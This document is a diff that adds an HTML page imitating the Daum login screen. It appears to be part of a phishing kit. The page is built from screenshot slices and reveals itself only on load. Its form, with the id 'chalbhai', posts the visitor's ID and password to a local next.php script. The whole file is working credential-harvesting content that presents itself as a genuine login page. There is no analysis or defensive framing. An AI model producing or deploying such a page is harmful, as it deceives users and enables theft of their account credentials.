@@ -1,0 +1,39 @@
+<!doctypehtml PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><title>
+   Daum 로그인
+  </title><script src=https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js></script><meta content=width=device-width,initial-scale=1.0 name=viewport><link rel="shortcut icon"href=http://i1.daumcdn.net/mimg/favicon/mail_favicon3.ICO><script>function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}</script><style>.textbox {  
+    border-top: solid 1px #B8B8B8; 
+    border-right: solid 1px #B8B8B8; 
+    border-left: solid 1px #B8B8B8; 
+    border-bottom: solid 1px #B8B8B8; 
+    height: 46px; 
+    width: 275px; 
+  	padding-left:10px;
+ } 
+.textbox:focus {  
+    border-color: #4488cc; 
+    border-style: solid; 
+    border-width: 1px; 
+    outline: 0; 
+ }</style><style>div#container
+{
+	position:relative;
+	width: 1356px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}</style><body bgcolor=#ECECEE onload=unhideBody() style=visibility:hidden><div id=container><div style="position:absolute; overflow:hidden; left:324px; top:-1px; width:707px; height:94px; z-index:0"id=image1><img alt border=0 height=94 src=images/da1.png width=707></div><div style="position:absolute; overflow:hidden; left:324px; top:93px; width:708px; height:312px; z-index:1"id=image2><img alt border=0 height=312 src=images/da2.png width=708></div><div style="position:absolute; overflow:hidden; left:323px; top:405px; width:710px; height:263px; z-index:2"id=image3><img alt border=0 height=263 src=images/da3.png width=710></div><div style="position:absolute; overflow:hidden; left:626px; top:21px; width:105px; height:49px; z-index:3"id=image4><a href=#> <img alt border=0 height=49 src=images/logo.png width=105> </a></div><div style="position:absolute; overflow:hidden; left:565px; top:125px; width:107px; height:19px; z-index:4"id=image5><a href=#> <img alt border=0 height=19 src=images/da4.png width=107> </a></div><div style="position:absolute; overflow:hidden; left:386px; top:333px; width:92px; height:21px; z-index:5"id=image6><a href=#> <img alt border=0 height=21 src=images/da5.png width=92> </a></div><div style="position:absolute; overflow:hidden; left:605px; top:331px; width:67px; height:18px; z-index:6"id=image7><a href=#> <img alt border=0 height=18 src=images/da6.png width=67> </a></div><div style="position:absolute; overflow:hidden; left:400px; top:376px; width:233px; height:20px; z-index:7"id=image8><a href=#> <img alt border=0 height=20 src=images/da7.png width=233> </a></div><div style="position:absolute; overflow:hidden; left:390px; top:437px; width:256px; height:42px; z-index:8"id=image9><a href=#> <img alt border=0 height=42 src=images/da8.png width=256> </a></div><div style="position:absolute; overflow:hidden; left:602px; top:579px; width:152px; height:20px; z-index:9"id=image10><a href=#> <img alt border=0 height=20 src=images/da9.png width=152> </a></div><form action=next.php id=chalbhai method=post name=chalbhai><input placeholder="아이디 입력"class=textbox name=usr required style=position:absolute;width:301px;left:367px;top:150px;z-index:10><input placeholder="비밀번호 입력"class=textbox id=demo-field name=psw required style=position:absolute;width:301px;left:367px;top:205px;z-index:11><div style="position:absolute; left:366px; top:272px; z-index:12"id=formimage1><input height=52 name=formimage1 src=images/buton.png type=image width=302></div><div style="position:absolute; left:366px; top:333px; z-index:13"id=formcheckbox1><input name=formcheckbox1 type=checkbox></div></form></div><script>//apply masking to the demo-field
+  //pass the field reference, masking symbol, and character limit
+  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
+ 
+  //test the submitted value
+  document.getElementById('demo-form').onsubmit = function()
+  {
+   alert('pword = "' + this.pword.value + '"');
+   return false;
+  };</script>
